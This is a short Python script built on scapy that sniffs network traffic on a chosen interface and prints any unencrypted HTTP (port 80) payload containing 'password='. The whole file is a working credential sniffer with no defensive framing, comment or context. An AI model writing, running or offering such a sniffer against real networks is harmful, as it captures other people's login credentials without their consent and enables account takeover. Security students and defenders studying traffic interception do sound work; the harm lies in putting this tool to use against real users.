from scapy.all import *

def start(iface):
    def passwordsniff(pack):
        if pack.haslayer(TCP) and (pack[TCP].sport == 80 or pack[TCP].dport == 80) and pack.haslayer(Raw):
            load = pack[Raw].load.decode()
            if "password=" in load:
                print(load)

    sniff(iface=iface, prn=passwordsniff)
